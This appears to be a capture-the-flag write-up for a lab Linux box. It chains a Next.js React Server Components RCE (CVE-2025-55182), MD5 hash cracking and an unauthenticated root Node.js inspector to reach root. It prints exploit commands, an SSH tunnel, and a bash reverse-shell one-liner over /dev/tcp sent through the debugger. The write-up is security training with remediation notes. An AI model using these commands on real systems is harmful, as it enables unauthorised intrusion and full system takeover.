# Reactor

**Season 11 — Easy Linux Box**

## Summary

Initial access was achieved by exploiting **CVE-2025-55182** (React Server Components deserialization RCE) in the Next.js 15.0.3 application, yielding code execution as the low-privileged `node` user.

A SQLite database belonging to the application was then exfiltrated, exposing MD5-hashed credentials; one hash was cracked, revealing the password for the `engineer` account, which granted interactive SSH access and the user flag.

Post-exploitation process enumeration identified a root-owned Node.js worker running with an unauthenticated inspector on loopback port `9229`. Attaching to this debugger and executing JavaScript through the Chrome DevTools Protocol yielded arbitrary command execution as root and full system compromise.

**Root cause:** three independent flaws chained together — an outdated and vulnerable framework (CVE-2025-55182), weak credential storage (unsalted MD5), and active debug code running as root (CWE-489, CWE-250). Remediation of any single link would have broken the chain.

---

## Reconnaissance

### Nmap

```bash
sudo nmap -sC -sV -O -p- --min-rate 5000 -oN nmap_full.txt 10.129.111.167
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-18 18:00 -0400
Nmap scan report for reactor.htb (10.129.111.167)
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000,
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Fri, 18 Sep 2026 22:00:00 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head>...(truncated)
|   HTTPOptions:
|     HTTP/1.1 400 Bad Request
|     Allow: GET
|     Allow: HEAD
1 service unrecognized despite returning data.
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 52.28 seconds
```

Two open ports: `22/tcp` (SSH) and `3000/tcp`, fingerprinted as a Next.js 15.0.3 application.

### Usernames discovered

| # | Name              | Role                 | Status |
|---|-------------------|----------------------|--------|
| 1 | Dr. Elena Rodriguez | Lead Nuclear Engineer | Online |
| 2 | MK. Marcus Kim      | Senior Technician     | Online |
| 3 | JT. James Thompson  | Safety Officer        | —      |

### Features identified

- React
- Web framework: Next.js `15.0.3`

---

## Exploitation Phase

### CVE

The website is vulnerable to **React2Shell-CVE-2025-55182**:

> [SpeatX/React2Shell-CVE-2025-55182](https://github.com) — CVE-2025-55182: Unauthenticated RCE in React Server Components (React2Shell). CVSS 10.0 exploit tool for authorized penetration testing.

**Terminal 1 — launch the exploit:**

```bash
python exploit.py revshell -t http://TARGET_IP --lhost LOCAL_IP --lport 4444
```

**Terminal 2 — catch the shell:**

```bash
nc -lvnp 4444
```

### Initial foothold

```
listening on [any] 4444 ...
connect to [10.10.14.125] from (UNKNOWN) [10.129.112.100] 53512
bash: cannot set terminal process group (1396): Inappropriate ioctl for device
bash: no job control in this shell
node@reactor:/opt/reactor-app$ ls
app
next.config.js
node_modules
package.json
package-lock.json
reactor.db
```

The app database (`reactor.db`) contained users and their MD5-hashed passwords.

### Cracking the hash (Hashcat)

Cracked the hash for the `Engineer` account:

```bash
hashcat -m 0 'md5 hash' /usr/share/wordlists/rockyou.txt 
```

### User flag

```bash
ssh engineer@10.129.112.102
```

```
engineer@10.129.112.102's password:

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7

    AUTHORIZED PERSONNEL ONLY
Last login: Sun Sep 20 00:38:13 2026 from 10.10.14.125
engineer@reactor:~$ ls
user.txt
```

---

## Privilege Escalation

### Enumerating listening services

```bash
ss -tunlp
```

```
Netid State  Recv-Q Send-Q Local Address:Port   Peer Address:Port Process
tcp   LISTEN 0      511    127.0.0.1:9229       0.0.0.0:*
tcp   LISTEN 0      4096   127.0.0.54:53        0.0.0.0:*
tcp   LISTEN 0      4096   0.0.0.0:22           0.0.0.0:*
tcp   LISTEN 0      4096   127.0.0.53%lo:53     0.0.0.0:*
tcp   LISTEN 0      4096   [::]:22              [::]:*
tcp   LISTEN 0      511    *:3000               *:*
```

`127.0.0.1:9229` stood out as suspicious — the default Node.js debug inspector port.

### Confirming the process (ps aux)

```
USER  PID  %CPU %MEM  VSZ    RSS   TTY STAT START TIME COMMAND
node  1382 0.2  2.2   11807404 89476 ?  Ssl  09:05 0:00 next-server (v15.0.3)
root  1384 0.0  1.0   1066244  43408 ?  Ssl  09:05 0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

A **root-owned** Node.js process was running with the debug inspector bound to loopback, unauthenticated.

### Exploiting the exposed inspector

```bash
# Connect to the target first
ssh engineer@TARGET_IP

# Open a second terminal in Kali for port forwarding
ssh -L 9229:127.0.0.1:9229 engineer@TARGET_IP

# Curl to test the tunneling
curl http://localhost:9229/json

# Launch your nc listener in another terminal
nc -lvnp 4444

# Reconnect to the target again for the final exploitation
node inspect 127.0.0.1:9229
```

Once the debugging CLI is attached, trigger command execution as root:

```js
exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/TUN0_IP/4444 0>&1\"').toString()")
```

### Root flag

```
listening on [any] 4444 ...
connect to [10.10.17.143] from (UNKNOWN) [10.129.135.248] 58608
bash: cannot set terminal process group (1384): Inappropriate ioctl for device
bash: no job control in this shell
root@reactor:/# cd root/
root@reactor:~# ls -l
total 4
-rw-r----- 1 root root 33 Sep 20 09:06 root.txt
```

---

## Key Takeaways

Three independent flaws chained together to produce full compromise:

1. **Outdated, vulnerable framework** — Next.js 15.0.3, vulnerable to CVE-2025-55182 (unauthenticated RCE via React Server Components deserialization).
2. **Weak credential storage** — unsalted MD5 password hashes, trivially cracked with a wordlist.
3. **Active debug code running as root** — an unauthenticated Node.js inspector (CWE-489: Active Debug Code, CWE-250: Execution with Unnecessary Privileges) exposed on loopback.

Fixing any single one of these would have broken the chain.
